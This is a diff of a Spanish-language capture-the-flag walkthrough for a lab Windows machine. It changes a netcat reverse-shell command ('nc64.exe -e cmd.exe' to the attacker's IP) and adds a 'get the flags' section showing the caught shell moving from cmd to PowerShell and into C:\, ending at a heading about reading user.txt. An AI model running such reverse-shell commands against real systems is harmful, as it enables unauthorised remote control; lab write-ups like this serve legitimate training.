@@ -352,9 +352,37 @@ nc64.exe --> https://github.com/int0x33/nc.exe/
 	└─# rlwrap nc -lvnp 1988
 	listening on [any] 1988 ...
 	connect to [10.9.92.151] from (UNKNOWN) [10.10.80.141] 50302
-	nc.exe -e cmd.exe 10.9.92.151 2000
+	nc64.exe -e cmd.exe 10.9.92.151 2000
 
 ![image](https://github.com/Esevka/CTF/assets/139042999/48191d62-a9cd-4f27-ab30-3a355212f117)
+
+## Obtenemos Flags
+
+Cuando obtenemos consola en la maquina si nos fijamos la unidad es la E:\ , que es donde se encuentra montado toda la web a nosotros en estos momentos nos interesa C:\
+
+- Desde la consola(Simbolo del sistema,cmd.exe) no nos permite realizar el cambio a C:\ por lo que vamos a intentarlo desde powershell.
+  
+		┌──(root㉿kali)-[/home/…/ctf/try_ctf/iron_corp/contenido]
+		└─# rlwrap nc -lvnp 2000
+		listening on [any] 2000 ...
+		connect to [10.9.92.151] from (UNKNOWN) [10.10.80.141] 50320
+		Microsoft Windows [Version 10.0.14393]
+		(c) 2016 Microsoft Corporation. All rights reserved.
+		
+		E:\xampp\htdocs\internal>cd c:
+		cd c:
+		E:\xampp\htdocs\internal>powershell
+		powershell
+		Windows PowerShell 
+		Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+		
+		PS E:\xampp\htdocs\internal>cd c:\
+		cd c:\
+		PS C:\>
+  - Leemos flag user.txt
+  
+
+
 
 
 
